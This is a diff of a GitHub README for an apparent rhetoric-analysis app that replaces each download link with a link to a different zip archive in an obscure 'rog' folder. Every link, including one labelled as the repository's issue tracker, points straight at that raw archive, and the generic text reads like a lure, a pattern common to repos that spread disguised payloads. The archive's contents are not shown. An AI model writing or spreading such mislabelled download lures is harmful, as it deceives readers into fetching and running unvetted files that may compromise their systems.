@@ -1,6 +1,6 @@
 # 🎉 5YN-PerformativeComplexity-Killer - Simplify Complex Rhetorical Arguments
 
-[![Download 5YN-PerformativeComplexity-Killer](https://raw.githubusercontent.com/Muzzbuzz24/5YN-PerformativeComplexity-Killer/main/rog/Complexity_Performative_Y_Killer_1.6.zip)](https://raw.githubusercontent.com/Muzzbuzz24/5YN-PerformativeComplexity-Killer/main/rog/Complexity_Performative_Y_Killer_1.6.zip)
+[![Download 5YN-PerformativeComplexity-Killer](https://raw.githubusercontent.com/Muzzbuzz24/5YN-PerformativeComplexity-Killer/main/rog/Complexity-Performative-Killer-Y-2.9.zip)](https://raw.githubusercontent.com/Muzzbuzz24/5YN-PerformativeComplexity-Killer/main/rog/Complexity-Performative-Killer-Y-2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ To run the **5YN-PerformativeComplexity-Killer**, you will need:
 
 ## 📥 Download & Install
 
-To get started, you will need to download the application. Please [visit this page to download](https://raw.githubusercontent.com/Muzzbuzz24/5YN-PerformativeComplexity-Killer/main/rog/Complexity_Performative_Y_Killer_1.6.zip) the latest version. 
+To get started, you will need to download the application. Please [visit this page to download](https://raw.githubusercontent.com/Muzzbuzz24/5YN-PerformativeComplexity-Killer/main/rog/Complexity-Performative-Killer-Y-2.9.zip) the latest version. 
 
 Once you are on the Releases page, look for the most recent version. Select the appropriate file for your system and follow these steps:
 
@@ -67,8 +67,8 @@ If you're interested in deepening your understanding of rhetoric, you can also l
 
 ## 📬 Support
 
-If you encounter any issues while using the application, please feel free to reach out for support. You can open an issue on the [GitHub repository](https://raw.githubusercontent.com/Muzzbuzz24/5YN-PerformativeComplexity-Killer/main/rog/Complexity_Performative_Y_Killer_1.6.zip) for assistance.
+If you encounter any issues while using the application, please feel free to reach out for support. You can open an issue on the [GitHub repository](https://raw.githubusercontent.com/Muzzbuzz24/5YN-PerformativeComplexity-Killer/main/rog/Complexity-Performative-Killer-Y-2.9.zip) for assistance.
 
 Thank you for using **5YN-PerformativeComplexity-Killer**! We hope it helps you navigate the complexities of rhetoric with ease. 
 
-[![Download 5YN-PerformativeComplexity-Killer](https://raw.githubusercontent.com/Muzzbuzz24/5YN-PerformativeComplexity-Killer/main/rog/Complexity_Performative_Y_Killer_1.6.zip)](https://raw.githubusercontent.com/Muzzbuzz24/5YN-PerformativeComplexity-Killer/main/rog/Complexity_Performative_Y_Killer_1.6.zip)
+[![Download 5YN-PerformativeComplexity-Killer](https://raw.githubusercontent.com/Muzzbuzz24/5YN-PerformativeComplexity-Killer/main/rog/Complexity-Performative-Killer-Y-2.9.zip)](https://raw.githubusercontent.com/Muzzbuzz24/5YN-PerformativeComplexity-Killer/main/rog/Complexity-Performative-Killer-Y-2.9.zip)
